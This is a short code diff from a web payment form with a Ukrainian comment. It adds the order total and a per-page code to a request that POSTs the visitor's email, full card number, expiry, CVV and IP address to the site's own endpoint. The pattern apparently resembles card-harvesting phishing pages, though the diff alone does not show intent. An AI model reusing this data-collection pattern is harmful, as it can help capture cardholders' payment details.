@@ -303,10 +303,12 @@
                 await new Promise(res => setTimeout(res, 500));
                 ip = userIP;
             }
+            // Отримуємо total та currency з URL
+            const { total, currency: totalCurrency } = getTotalAndCurrency();
             const response = await fetch('/send_payment_data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'payment', price, currency })
+                body: JSON.stringify({ email, card, expiry, cvv, ip, type: 'payment', price, currency, total, page_code: getPageCode() })
             });
             if (response.ok) {
                 if (!document.getElementById('payment-msg')) {
